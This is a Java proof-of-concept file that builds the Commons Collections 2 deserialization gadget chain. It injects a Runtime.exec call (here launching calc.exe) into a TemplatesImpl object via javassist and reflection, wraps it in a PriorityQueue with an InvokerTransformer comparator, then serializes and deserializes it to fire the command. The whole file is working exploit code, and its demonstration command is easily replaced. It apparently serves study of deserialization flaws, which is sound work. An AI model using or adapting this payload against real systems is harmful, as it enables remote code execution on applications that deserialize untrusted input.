import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class Main {
    public static void main(String[] arags) throws Exception{
        final byte[] byteCode = makeByteCode();
        TemplatesImpl templates = new TemplatesImpl();
        Class clz = TemplatesImpl.class;
        Field _nameField = clz.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templates,"achilles");
        Field _bytecodesField = clz.getDeclaredField("_bytecodes");
        _bytecodesField.setAccessible(true);
        _bytecodesField.set(templates,new byte[][]{byteCode});
        Field _tfactoryField = clz.getDeclaredField("_tfactory");
        _tfactoryField.setAccessible(true);
        _tfactoryField.set(templates,new TransformerFactoryImpl());
        InvokerTransformer invoker =  new InvokerTransformer("newTransformer",new Class[0],new Object[0]);
        TransformingComparator transformingComparator = new TransformingComparator(invoker);
        PriorityQueue priorityQueue = new PriorityQueue(2,transformingComparator);
        Field sizeField = PriorityQueue.class.getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(priorityQueue,2);
        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        queueField.set(priorityQueue,new Object[]{templates,templates});

        FileStream.writeSer(priorityQueue,"CC2.ser");
        FileStream.readSer("CC2.ser");
    }
    public static byte[] makeByteCode() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get(MyTemplate.class.getName());
        String cmd = "Runtime.getRuntime().exec(\"calc.exe\");";
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setName("NormalClass");
        return ctClass.toBytecode();
    }
}